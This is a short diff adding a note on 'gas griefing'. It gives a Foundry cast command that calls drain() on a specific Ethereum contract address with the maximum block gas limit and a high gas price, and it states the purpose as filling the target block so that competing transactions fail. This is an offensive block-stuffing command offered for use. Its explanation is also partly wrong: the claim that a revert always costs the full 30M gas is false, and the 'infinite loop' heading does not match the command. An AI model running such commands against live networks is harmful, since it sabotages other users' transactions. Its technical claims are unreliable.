@@ -1,0 +1,9 @@
+Gas griefing via infinite loop call to target contract:
+
+cast send 0x742d35Cc6634C0532925a3b844Bc454e4438f44e \
+  "drain()" \
+  --gas-limit 30000000 \
+  --gas-price 200000000000 \
+  --private-key $KEY
+
+This calls the drain() function with max block gas limit (30M). Even if it reverts, you pay all 30M gas units. At 200 gwei, total cost: 6 ETH. This ensures the target block is full and competing transactions fail.
